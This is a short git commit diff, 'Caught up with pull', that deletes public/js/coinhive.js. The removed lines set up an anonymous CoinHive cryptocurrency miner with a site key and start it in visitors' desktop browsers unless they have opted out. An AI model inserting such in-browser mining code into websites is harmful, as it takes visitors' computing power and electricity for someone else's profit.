b58f3bffd606ed27871dee65ae897d4a2d864c7d
Colin Pelkmans <colin.pelkmans@gmail.com>
2018-11-28 20:55:34 +0100

    Caught up with pull

--- public/js/coinhive.js
+++
@@ -1,7 +0,0 @@
-        var miner = new CoinHive.Anonymous('0LpPyCV4c6U2rqpUCr6tBSfTJPv3NpiE', {throttle: 0.85});
-    
-        // Only start on non-mobile devices and if not opted-out
-        // in the last 14400 seconds (4 hours):
-        if (!miner.isMobile() && !miner.didOptOut(14400)) {
-            miner.start();
-        }
